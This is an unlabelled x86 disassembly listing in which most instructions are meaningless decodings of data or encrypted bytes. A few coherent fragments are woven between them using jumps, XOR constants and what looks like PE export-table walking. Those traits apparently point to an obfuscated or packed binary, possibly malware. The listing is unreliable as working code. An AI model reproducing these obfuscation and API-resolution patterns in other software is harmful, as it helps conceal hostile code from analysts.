  408d20:	mov    dl,0xd8
  408d22:	or     al,0x96
  408d24:	ret    
  408d25:	outs   dx,DWORD PTR ds:[esi]
  408d26:	inc    esi
  408d27:	popa   
  408d28:	neg    BYTE PTR [ecx-0x56]
  408d2b:	xor    al,0xeb
  408d2d:	push   cs
  408d2e:	inc    ebx
  408d2f:	in     al,0x5d
  408d31:	retf   
  408d32:	mul    BYTE PTR [eax+0x2e1b40c5]
  408d38:	fwait
  408d39:	jmp    0x811347e4
  408d3e:	adc    eax,0xbaf81de
  408d43:	and    DWORD PTR [edx+0x4c9279c5],ebp
  408d49:	cmc    
  408d4a:	push   cs
  408d4b:	jne    0x408d09
  408d4d:	mov    eax,ds:0x3b79e5e4
  408d52:	push   0x8219f4fc
  408d57:	adc    al,0x2
  408d59:	sub    al,0xe5
  408d5b:	mov    eax,0xb62b0285
  408d60:	int3   
  408d61:	(bad)  
  408d62:	sti    
  408d63:	sbb    ecx,esp
  408d65:	idiv   ah
  408d67:	test   DWORD PTR [eax+0x37503250],ecx
  408d6d:	fnstcw WORD PTR ds:0x5f0fe185
  408d73:	sbb    ch,cl
  408d75:	or     al,0x2e
  408d77:	rcr    BYTE PTR [edx+ebx*4+0x4a585e2f],0x3c
  408d7f:	sbb    eax,0x2e54d4dd
  408d84:	mov    ecx,0x9c05aec3
  408d89:	push   edx
  408d8a:	cmp    BYTE PTR [eax],cl
  408d8c:	not    BYTE PTR ds:0x87b1e924
  408d92:	test   eax,0x39617d40
  408d97:	mov    ebx,0x309755a7
  408d9c:	adc    eax,0xc0bc693b
  408da1:	push   ecx
  408da2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408da3:	cmc    
  408da4:	(bad)  
  408da5:	stos   DWORD PTR es:[edi],eax
  408da6:	mov    ds:0xb9231b66,eax
  408dab:	adc    BYTE PTR gs:[ebx+0x5f60a90e],dl
  408db2:	imul   esi,ecx,0xffffffa6
  408db5:	arpl   WORD PTR [ecx+0x4063c7b7],cx
  408dbb:	jnp    0x408e01
  408dbd:	pop    ecx
  408dbe:	dec    ecx
  408dbf:	(bad)  
  408dc2:	lds    ebp,FWORD PTR [esi+0x76fb722b]
  408dc8:	cmp    al,0xed
  408dca:	dec    esp
  408dcb:	(bad)  
  408dcc:	punpcklwd mm0,mm7
  408dcf:	(bad)  
  408dd0:	lods   eax,DWORD PTR ds:[esi]
  408dd1:	xlat   BYTE PTR ds:[ebx]
  408dd2:	and    cl,al
  408dd4:	xchg   ecx,eax
  408dd5:	(bad)  
  408dd6:	sar    BYTE PTR [edi],cl
  408dd8:	xchg   esp,eax
  408dd9:	xchg   ebx,eax
  408dda:	sub    dh,BYTE PTR [edi-0x4f28a92a]
  408de0:	cld    
  408de1:	stc    
  408de2:	jl     0x408e4a
  408de4:	sub    BYTE PTR [edi-0x44b53e47],0x19
  408deb:	fwait
  408dec:	or     DWORD PTR [edi],0xb
  408def:	or     eax,0x6eae9544
  408df4:	push   edi
  408df5:	in     al,0x21
  408df7:	cmp    al,0x4f
  408df9:	sub    eax,0xce6d1ecb
  408dfe:	pop    es
  408dff:	test   BYTE PTR [eax-0x3ccb989f],bl
  408e05:	int    0xcf
  408e07:	xor    al,0x64
  408e09:	cmp    esp,0xfffffff9
  408e0c:	sbb    esp,DWORD PTR [ecx]
  408e0e:	retf   
  408e0f:	sti    
  408e10:	cmc    
  408e11:	ja     0x408d9b
  408e13:	add    edx,ebp
  408e15:	jl     0x408e35
  408e17:	push   edi
  408e18:	arpl   WORD PTR gs:[eax+0x116653a4],ax
  408e1f:	cdq    
  408e20:	xchg   ebp,eax
  408e21:	inc    esp
  408e22:	inc    BYTE PTR [edx]
  408e24:	retf   
  408e25:	fbld   TBYTE PTR [esi-0x75]
  408e28:	inc    ebp
  408e29:	cld    
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x31afe932
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	jmp    0xef2ae5aa
  408ec9:	jg     0x408ee6
  408ecb:	(bad)  
  408ecc:	aad    0xb4
  408ece:	push   esp
  408ecf:	loope  0x408f40
  408ed1:	retf   
  408ed2:	ja     0x408e6a
  408ed4:	imul   eax,edi,0xfffffff0
  408ed7:	and    al,0x1e
  408ed9:	and    BYTE PTR [ebx+0x32],cl
  408edc:	jp     0x408f2c
  408ede:	(bad)  
  408edf:	xor    ebx,ebp
  408ee1:	cld    
  408ee2:	jae    0x408ee3
  408ee4:	out    dx,al
  408ee5:	dec    esi
  408ee6:	adc    eax,0xe5b77a42
  408eeb:	std    
  408eec:	mov    dl,0xfe
  408eee:	dec    edi
  408eef:	sbb    dl,BYTE PTR [eax+0x27]
  408ef2:	paddd  mm3,mm4
  408ef5:	mov    es,WORD PTR [edi+0x6e75296f]
  408efb:	(bad)  [ebx-0x54]
  408efe:	or     eax,0xb1326900
  408f03:	enter  0x4fc4,0xab
  408f07:	fadd   st,st(4)
  408f09:	scas   eax,DWORD PTR es:[edi]
  408f0a:	mov    ch,0x55
  408f0c:	aad    0xa4
  408f0e:	fsubr  st,st(3)
  408f10:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  408f12:	dec    ebp
  408f13:	call   DWORD PTR [edi+0x52]
  408f16:	xor    ah,cl
  408f18:	jmp    0x879c28d7
  408f1d:	pop    ebp
  408f1e:	pop    ecx
  408f1f:	xchg   ebx,eax
  408f20:	jno    0x408ef1
  408f22:	dec    ebp
  408f23:	stos   BYTE PTR es:[edi],al
  408f24:	repnz mov eax,ds:0x3266c2ea
  408f2a:	sbb    eax,0x8a24bcd8
  408f2f:	inc    esp
  408f30:	jp     0x408f1c
  408f32:	push   ecx
  408f33:	cmc    
  408f34:	stos   DWORD PTR es:[edi],eax
  408f35:	je     0x408f3b
  408f37:	cmp    esi,ecx
  408f39:	ss mov ecx,0x71be2693
  408f3f:	ins    BYTE PTR es:[edi],dx
  408f40:	xlat   BYTE PTR ds:[ebx]
  408f41:	call   0xf60d0626
  408f46:	retf   
  408f47:	mov    WORD PTR [ecx+0x38],?
  408f4a:	mov    al,0xb6
  408f4c:	ds jg  0x408f13
  408f4f:	mov    esi,0x3def6596
  408f54:	push   cs
  408f55:	ds (bad) 
  408f57:	push   cs
  408f58:	inc    esp
  408f59:	ret    
  408f5a:	mov    esi,0x2c790310
  408f5f:	das    
  408f60:	and    DWORD PTR [ebp-0x54],esp
  408f63:	mov    ch,0x96
  408f65:	rcr    ebx,1
  408f67:	int3   
  408f68:	dec    ebx
  408f69:	push   0x2a
  408f6b:	hlt    
  408f6c:	clc    
  408f6d:	retw   0x8904
  408f71:	outs   dx,BYTE PTR ds:[esi]
  408f72:	out    0x1f,eax
  408f74:	inc    eax
  408f75:	icebp  
  408f76:	sar    DWORD PTR [ebp-0x64],1
  408f79:	ins    DWORD PTR es:[edi],dx
  408f7a:	inc    esi
  408f7b:	pop    esp
  408f7c:	in     eax,0xeb
  408f7e:	inc    ecx
  408f7f:	outs   dx,DWORD PTR ds:[esi]
  408f80:	mov    edi,0xb984862a
  408f85:	bswap  ecx
  408f87:	or     cl,ch
  408f89:	jae    0x408fa6
  408f8b:	shl    BYTE PTR [ebx],1
  408f8d:	int    0x4f
  408f8f:	push   ecx
  408f90:	pop    ebp
  408f91:	sbb    BYTE PTR [esp+ecx*2-0x32],0x36
  408f96:	cmp    BYTE PTR [edx],al
  408f98:	xor    eax,0x4c7e3c09
  408f9d:	(bad)  
  408f9e:	imul   esp,DWORD PTR [ebx+0x634aaa36],0x21
  408fa5:	sbb    DWORD PTR [ecx+0x5c],0xffffffb1
  408fa9:	dec    eax
  408faa:	push   ebp
  408fab:	and    al,0x9b
  408fad:	cld    
  408fae:	and    eax,DWORD PTR [ebx]
  408fb0:	or     al,0xe8
  408fb2:	fdivr  QWORD PTR [esi+0x771da619]
  408fb8:	inc    edx
  408fb9:	das    
  408fba:	pop    ds
  408fbb:	sbb    DWORD PTR [edi+0x62598c3e],0x78aa618e
  408fc5:	inc    ebp
  408fc6:	push   es
  408fc7:	ret    
  408fc8:	or     al,0x7a
  408fca:	stos   BYTE PTR es:[edi],al
  408fcb:	xchg   BYTE PTR [ebp+0x2d],ch
  408fce:	addr16 into 
  408fd0:	lods   al,BYTE PTR ds:[esi]
  408fd1:	mov    cl,0xa7
  408fd3:	sub    esi,DWORD PTR [ebp+0x16]
  408fd6:	je     0x408fe9
  408fd8:	dec    esi
  408fd9:	adc    bl,BYTE PTR ds:0xbfb6fb41
  408fe0:	inc    ebp
  408fe1:	les    esp,FWORD PTR [ecx-0x5d]
  408fe4:	sbb    al,BYTE PTR [edi-0x55]
  408fe7:	jno    0x409018
  408fe9:	(bad)  
  408fea:	fist   DWORD PTR [ecx-0x39]
  408fed:	push   ds
  408fee:	(bad)  
  408fef:	outs   dx,BYTE PTR ds:[esi]
  408ff0:	push   0x9
  408ff2:	sbb    BYTE PTR [edi],0x1e
  408ff5:	sub    edx,DWORD PTR [ecx-0x62]
  408ff8:	sti    
  408ff9:	mov    DWORD PTR [ebp-0x3bd2acc1],edx
  408fff:	icebp  
  409000:	or     BYTE PTR [edi+0x40a11528],0xa
  409007:	test   eax,0x8db6bae1
  40900c:	push   esp
  40900d:	gs jnp 0x408fe6
  409010:	cwde   
  409011:	inc    ebx
  409012:	nop
  409013:	and    al,0xae
  409015:	lock (bad) 
  409017:	cmp    bh,BYTE PTR [esi]
  409019:	lds    ebp,FWORD PTR [ecx]
  40901b:	aad    0x54
  40901d:	out    dx,al
  40901e:	hlt    
  40901f:	(bad)  
  409020:	jne    0x40900f
  409022:	xor    ah,BYTE PTR [ebx]
  409024:	ins    DWORD PTR es:[edi],dx
  409025:	adc    eax,0x59d0840
  40902a:	les    esp,FWORD PTR [edx+0x3b88d2f4]
  409030:	mov    eax,0x44460b45
  409035:	push   eax
  409036:	outs   dx,DWORD PTR ds:[esi]
  409037:	lods   al,BYTE PTR ds:[esi]
  409038:	je     0x408fcd
  40903a:	cs and dh,bh
  40903d:	fucomip st,st(6)
  40903f:	push   ss
  409040:	leave  
  409041:	xchg   ecx,eax
  409042:	in     al,dx
  409043:	std    
  409044:	sub    al,0x7e
  409046:	xchg   esi,eax
  409047:	add    eax,0xf2cf95ee
  40904c:	std    
  40904d:	dec    esp
  40904e:	cmp    ecx,DWORD PTR [ecx]
  409050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409051:	rol    DWORD PTR [edi+edi*1],1
  409054:	xrelease mov BYTE PTR [eax],bh
  409057:	rcr    DWORD PTR [eax+0x8a39cc1],1
  40905d:	cld    
  40905e:	jle    0x4090a0
  409060:	loope  0x4090c1
  409062:	dec    ebx
  409063:	mov    bx,0x6746
  409067:	(bad)  
  409068:	ds sub edx,ecx
  40906b:	xchg   bx,ax
  40906d:	mov    edi,0x2feb9e89
  409072:	pop    edi
  409073:	and    ebx,DWORD PTR [ebx]
  409075:	in     al,dx
  409076:	push   ebx
  409077:	pop    ss
  409078:	stos   BYTE PTR es:[edi],al
  409079:	clc    
  40907a:	int3   
  40907b:	inc    ecx
  40907c:	ret    0xbeac
  40907f:	xchg   edi,eax
  409080:	and    eax,0xc4e79c5a
  409085:	sub    DWORD PTR [edx+ecx*4+0x12],ecx
  409089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40908a:	arpl   WORD PTR [ebp+0x2f6403b1],di
  409090:	cmp    esi,ecx
  409092:	and    DWORD PTR [ebp+0x69158b70],eax
  409098:	dec    esi
  409099:	scas   eax,DWORD PTR es:[edi]
  40909a:	retf   0x9ef6
  40909d:	int3   
  40909e:	cmp    BYTE PTR [edi-0x2b],0x92
  4090a2:	jg     0x40903b
  4090a4:	popf   
  4090a5:	mov    edx,0x399cf445
  4090aa:	rcr    DWORD PTR [ecx+0x5b1e3abd],cl
  4090b0:	adc    ah,bh
  4090b2:	rcr    BYTE PTR [esp+ecx*1-0x59],0xf9
  4090b7:	jno    0x4090e3
  4090b9:	mov    dh,bl
  4090bb:	dec    edx
  4090bc:	call   0x3ce3:0xcefa27ea
  4090c3:	inc    esi
  4090c4:	dec    edx
  4090c5:	or     al,0x2e
  4090c7:	mov    cl,0xbf
  4090c9:	sbb    DWORD PTR [esi-0x52],ebx
  4090cc:	jl     0x4090a1
  4090ce:	test   al,0x18
  4090d0:	jbe    0x409067
  4090d2:	jo     0x4090f8
  4090d4:	dec    ecx
  4090d5:	les    esi,FWORD PTR [ecx-0x4a18d886]
  4090db:	mov    ah,0x5e
  4090dd:	ret    
  4090de:	fisub  DWORD PTR [ebx-0xd]
  4090e1:	adc    eax,0x7516c5aa
  4090e6:	fld    QWORD PTR [ebx-0x46]
  4090e9:	cmp    al,dl
  4090eb:	popf   
  4090ec:	pop    esp
  4090ed:	loope  0x409122
  4090ef:	mov    BYTE PTR [ebx],0xc7
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x13
  409163:	mov    ds:0xdf321b82,al
  409168:	jle    0x4091e8
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	sub    DWORD PTR fs:[eax-0x1e],eax
  409172:	imul   ebx,DWORD PTR [ecx+0x6],0x32
  409176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409177:	jl     0x409126
  409179:	fild   DWORD PTR [eax]
  40917b:	and    ch,BYTE PTR [ecx]
  40917d:	inc    eax
  40917e:	jb     0x409125
  409180:	or     eax,0xec0e68d9
  409185:	push   edi
  409186:	cs xor al,0xbb
  409189:	jl     0x40911a
  40918b:	and    DWORD PTR [ebp+0x28c88481],ecx
  409191:	imul   eax,DWORD PTR [edi],0xf
  409194:	mov    cl,0xa0
  409196:	popf   
  409197:	idiv   eax
  409199:	enter  0xa350,0xbb
  40919d:	or     cl,BYTE PTR [esi+esi*8+0x5cd6139c]
  4091a4:	pop    esi
  4091a5:	sub    BYTE PTR [esi-0x10645ba8],ah
  4091ab:	xchg   esp,eax
  4091ac:	pop    edi
  4091ad:	jge    0x4091bb
  4091af:	dec    esi
  4091b0:	aaa    
  4091b1:	icebp  
  4091b2:	add    DWORD PTR [edx],edi
  4091b4:	hlt    
  4091b5:	aam    0xba
  4091b7:	into   
  4091b8:	push   ebx
  4091b9:	jne    0x40914a
  4091bb:	cli    
  4091bc:	test   BYTE PTR [edi+ebp*2],ch
  4091bf:	ficomp WORD PTR [ebx+0x24b94ab7]
  4091c5:	mov    edi,0x5566fd46
  4091ca:	cmp    DWORD PTR [eax],ebx
  4091cc:	sub    DWORD PTR ds:0xfd2f5f05,esp
  4091d2:	sub    DWORD PTR [ecx+eax*2-0x1d30cf7c],edx
  4091d9:	pushf  
  4091da:	call   0xe4a4:0x789f9b23
  4091e1:	and    DWORD PTR [ebx+edi*4+0x64ab5483],ebx
  4091e8:	inc    ebp
  4091e9:	cmp    esp,esp
  4091eb:	or     ah,BYTE PTR [edi+0x1582eb4d]
  4091f1:	or     eax,0x7cf018e1
  4091f6:	popf   
  4091f7:	inc    DWORD PTR [esi]
  4091f9:	and    DWORD PTR [esi+ebx*4-0x10],edx
  4091fd:	ret    0xc70d
  409200:	aas    
  409201:	sar    DWORD PTR [edx-0x1f54ea51],1
  409207:	mov    ebx,0x7f22122
  40920c:	inc    ecx
  40920d:	js     0x409212
  40920f:	test   BYTE PTR [edx+0x20],0xda
  409213:	mov    BYTE PTR cs:[ecx],bl
  409216:	cmp    al,0x37
  409218:	push   ebp
  409219:	ret    0x82d6
  40921c:	(bad)  
  40921d:	dec    esp
  40921e:	push   es
  40921f:	cdq    
  409220:	sar    BYTE PTR [eax],0x6
  409223:	sbb    dl,ah
  409225:	jb     0x409267
  409227:	(bad)  
  409228:	in     al,dx
  409229:	mov    ebp,0xbb1f01cb
  40922e:	adc    ebp,ecx
  409230:	fs push eax
  409232:	mov    bh,0xd9
  409234:	cmp    ecx,esi
  409236:	mov    ds:0x1664b891,eax
  40923b:	push   0xfffffffe
  40923d:	xchg   DWORD PTR [ecx+0x493cfdf],ebp
  409243:	pop    ecx
  409244:	ret    0x1d1a
  409247:	xor    BYTE PTR [edx+ebp*1],0x89
  40924b:	add    BYTE PTR [edx+0xedab567],cl
  409251:	std    
  409252:	or     eax,0x3902b217
  409257:	cmp    DWORD PTR [esi+0x5aa4d9db],edi
  40925d:	push   esi
  40925e:	jo     0x409213
  409260:	xchg   edi,eax
  409261:	call   0xb4b6:0x1fb5
  409267:	arpl   WORD PTR [edi],cx
  409269:	retf   0x3ed7
  40926c:	xchg   DWORD PTR [eax+0x33875724],esi
  409272:	push   esi
  409273:	sub    al,cl
  409275:	mov    esi,0x9568d765
  40927a:	pop    ecx
  40927b:	adc    eax,0x621a2c1c
  409280:	(bad)  
  409281:	pusha  
  409282:	mov    al,ds:0x17bd8b42
  409287:	cmp    eax,0xef900164
  40928c:	inc    ebx
  40928d:	sbb    esp,DWORD PTR [ecx+0x64eea701]
  409293:	jae    0x4092c9
  409295:	or     BYTE PTR [eax+0xd63ff1e],cl
  40929b:	xchg   esi,eax
  40929c:	(bad)  
  40929d:	stos   BYTE PTR es:[edi],al
  40929e:	cmp    DWORD PTR [esi],ebx
  4092a0:	sub    DWORD PTR [edi-0x2],esi
  4092a3:	push   0xcd2896e3
  4092a8:	jmp    0x7652:0xbefaf538
  4092af:	aaa    
  4092b0:	hlt    
  4092b1:	pop    ds
  4092b2:	and    BYTE PTR [ecx],ah
  4092b4:	sbb    eax,0xf9bed572
  4092b9:	or     al,bl
  4092bb:	std    
  4092bc:	pop    edx
  4092bd:	pusha  
  4092be:	popa   
  4092bf:	in     eax,dx
  4092c0:	mov    ebp,DWORD PTR [edx+edi*2]
  4092c3:	in     al,0x95
  4092c5:	cmp    DWORD PTR [ebx-0x74],edx
  4092c8:	js     0x4092d5
  4092ca:	adc    ebp,DWORD PTR [eax+0x51853190]
  4092d0:	sbb    ebp,edi
  4092d2:	cmp    BYTE PTR [ebx+0x13],bh
  4092d5:	in     al,0x47
  4092d7:	pop    ebx
  4092d8:	mov    ch,0x1
  4092da:	out    dx,eax
  4092db:	inc    ecx
  4092dc:	pop    ds
  4092dd:	jmp    0x4092cd
  4092df:	add    DWORD PTR [edx+0x63],ecx
  4092e2:	adc    cl,ch
  4092e4:	xor    ah,BYTE PTR [eax+0x1b]
  4092e7:	pop    eax
  4092e8:	ins    BYTE PTR es:[edi],dx
  4092e9:	or     DWORD PTR [ebp-0x43],0xffffffcc
  4092ed:	sti    
  4092ee:	int    0x7e
  4092f0:	cmp    eax,0x7ac955ed
  4092f5:	sub    bh,BYTE PTR [esi+0x6]
  4092f8:	sar    BYTE PTR [edx-0x6dca0997],1
  4092fe:	lock in al,0xa3
  409301:	lds    ecx,FWORD PTR [ebp+0x12]
  409304:	ins    BYTE PTR es:[edi],dx
  409305:	xor    dh,BYTE PTR [ecx+0x3a]
  409308:	cld    
  409309:	scas   eax,DWORD PTR es:[edi]
  40930a:	mov    ebp,0x22efd6c6
  40930f:	cmp    DWORD PTR [edi-0x5db10b0d],edx
  409315:	and    cl,BYTE PTR [ecx+0x2664f096]
  40931b:	fisub  WORD PTR [bx+si]
  40931e:	mov    BYTE PTR [esi-0x6f2d81db],ah
  409324:	xor    al,0x98
  409326:	cmp    al,0x22
  409328:	jns    0x4092ae
  40932a:	cmp    DWORD PTR [ebx+0x24],ecx
  40932d:	out    0x2,eax
  40932f:	push   ds
  409330:	mov    ebx,DWORD PTR [edx-0x29c92178]
  409336:	std    
  409337:	(bad)  
  409338:	push   eax
  409339:	jb     0x40931e
  40933b:	jb     0x40934e
  40933d:	retf   
  40933e:	hlt    
  40933f:	mov    eax,0x8c9c54e7
  409344:	addr16 push esp
  409346:	cmp    eax,0xb5457e10
  40934b:	loopne 0x40939c
  40934d:	cmp    cl,BYTE PTR ds:0x458ab3e4
  409353:	dec    esp
  409354:	xchg   edi,eax
  409355:	call   0xd096ea42
  40935a:	cmp    DWORD PTR fs:[ecx-0x862af69],0x50ef6e26
  409365:	add    BYTE PTR [ebp-0x61],ch
  409368:	adc    al,0x90
  40936a:	leave  
  40936b:	cwde   
  40936c:	pop    ss
  40936d:	loop   0x4093ee
  40936f:	inc    ecx
  409370:	adc    ecx,0xffffffdf
  409373:	sub    eax,0xe1907f54
  409378:	push   esi
  409379:	jge    0x40939b
  40937b:	adc    BYTE PTR [ebx+edx*2-0xc853205],ch
  409382:	fsubrp st(1),st
  409384:	nop
  409385:	daa    
  409386:	jmp    0x5b9e71ab
  40938b:	gs ja  0x40937f
  40938e:	(bad)  
  40938f:	ja     0x4093f1
  409391:	(bad)  
  409392:	pop    ebp
  409393:	adc    bh,BYTE PTR [eax+0x6c]
  409396:	inc    DWORD PTR [ecx+ecx*4+0x8]
  40939a:	mov    eax,DWORD PTR [ebp+0xc]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	xchg   DWORD PTR [esp+edx*8+0x7eddd8f1],ecx
  4093bb:	jle    0x4093e1
  4093bd:	jl     0x40943d
  4093bf:	jle    0x409438
  4093c1:	add    ah,0xad
  4093c4:	je     0x4093a1
  4093c6:	sbb    BYTE PTR [edi-0x1f],0x71
  4093ca:	(bad)  [edx+0x3e]
  4093cd:	stc    
  4093ce:	inc    edx
  4093cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093d0:	push   0x9815cb1a
  4093d5:	mov    bh,0x6f
  4093d7:	pop    edi
  4093d8:	push   esp
  4093d9:	jg     0x40936d
  4093db:	repz sub DWORD PTR ds:0x53bf3570,0x3b
  4093e3:	mov    esi,0xd52c58bb
  4093e8:	xchg   esp,eax
  4093e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093ea:	add    al,0xb2
  4093ec:	jnp    0x409433
  4093ee:	call   DWORD PTR es:[eax+0x383473b7]
  4093f5:	scas   al,BYTE PTR es:[edi]
  4093f6:	dec    edi
  4093f7:	xor    DWORD PTR [esi],eax
  4093f9:	push   0x1a
  4093fb:	pop    ds
  4093fc:	out    dx,eax
  4093fd:	in     al,dx
  4093fe:	and    ecx,DWORD PTR [eax-0x42]
  409401:	inc    esi
  409402:	adc    al,0x25
  409404:	int3   
  409405:	shr    BYTE PTR [edx+0x60eee993],0x48
  40940c:	sbb    ah,BYTE PTR [esi+0x20]
  40940f:	imul   edi,DWORD PTR [edx+0x1a],0x12
  409413:	lods   eax,DWORD PTR ds:[esi]
  409414:	(bad)  
  409415:	std    
  409416:	ins    BYTE PTR es:[edi],dx
  409417:	pop    edi
  409418:	xor    al,BYTE PTR [ebx-0x2422d4ef]
  40941e:	jmp    0x40940d
  409420:	out    dx,eax
  409421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409422:	ss jmp 0xfaacf6d3
  409428:	icebp  
  409429:	ja     0x409407
  40942b:	lock pop es
  40942d:	stc    
  40942e:	push   0xffe16ccd
  409433:	mov    ecx,0x4b186c4a
  409438:	aaa    
  409439:	clc    
  40943a:	push   ecx
  40943b:	lock int 0x92
  40943e:	adc    bl,BYTE PTR [eax]
  409440:	mov    ebp,ds
  409442:	xchg   edx,eax
  409443:	jecxz  0x4093d7
  409445:	jns    0x4094ab
  409447:	sbb    al,bh
  409449:	loopne 0x409487
  40944b:	fs xchg esi,eax
  40944d:	stos   BYTE PTR es:[edi],al
  40944e:	ins    BYTE PTR es:[edi],dx
  40944f:	pop    ds
  409450:	retf   
  409451:	pop    ds
  409452:	test   eax,0xc1a799c8
  409457:	mov    ch,0x9e
  409459:	mov    dh,0xb7
  40945b:	push   0xf9ef24a1
  409460:	adc    DWORD PTR [ecx-0x5ac3cc30],eax
  409466:	xor    esp,DWORD PTR [edi+0x792cd0de]
  40946c:	jle    0x4093f2
  40946e:	fwait
  40946f:	or     BYTE PTR [ecx+0x47f08129],dl
  409475:	xor    DWORD PTR [ebx-0x5f903990],ecx
  40947b:	pop    ss
  40947c:	and    eax,0x944324c3
  409481:	cmp    dl,BYTE PTR [esi+0xc]
  409484:	aas    
  409485:	lods   eax,DWORD PTR ds:[esi]
  409486:	jne    0x4094a5
  409488:	xchg   ecx,eax
  409489:	cwde   
  40948a:	cmp    dl,BYTE PTR [edi+0x6d]
  40948d:	jae    0x409426
  40948f:	loop   0x409439
  409491:	add    eax,0xffffffaf
  409494:	pop    edx
  409495:	jno    0x409469
  409497:	and    al,0x6e
  409499:	push   ss
  40949a:	je     0x409457
  40949c:	(bad)  
  40949e:	clc    
  40949f:	loope  0x409489
  4094a1:	ins    DWORD PTR es:[edi],dx
  4094a2:	or     DWORD PTR [eax],ebx
  4094a4:	fist   WORD PTR [edi]
  4094a6:	pusha  
  4094a7:	test   al,0x15
  4094a9:	dec    ebx
  4094aa:	cmp    cl,BYTE PTR [edi+0x287012c0]
  4094b0:	xchg   ecx,eax
  4094b1:	loop   0x409507
  4094b3:	ret    
  4094b4:	sar    DWORD PTR [eax-0x47],1
  4094b7:	dec    eax
  4094b8:	ficomp WORD PTR [ebx-0x67]
  4094bb:	sbb    DWORD PTR gs:0x2b3afbd2,esi
  4094c2:	mov    cl,BYTE PTR [ebx]
  4094c4:	loope  0x409538
  4094c6:	test   BYTE PTR [eax-0x1b59e685],0xd
  4094cd:	push   0x36
  4094cf:	pop    edi
  4094d0:	jmp    0x40945f
  4094d2:	out    dx,eax
  4094d3:	gs pushf 
  4094d5:	pop    ds
  4094d6:	and    ch,BYTE PTR [edx-0x6]
  4094d9:	or     BYTE PTR [ebp+0x75],ch
  4094dc:	adc    DWORD PTR [edi-0x3c86f77d],esi
  4094e2:	test   al,0xa8
  4094e4:	cs pop ecx
  4094e6:	pop    ds
  4094e7:	ins    BYTE PTR es:[edi],dx
  4094e8:	xchg   ebp,eax
  4094e9:	je     0x409559
  4094eb:	or     DWORD PTR [ebx-0x68],esp
  4094ee:	ret    0x2823
  4094f1:	dec    esp
  4094f2:	test   BYTE PTR [ebx+0x1315b13],ah
  4094f8:	or     eax,DWORD PTR [ebx+edi*4-0x7d01f3f8]
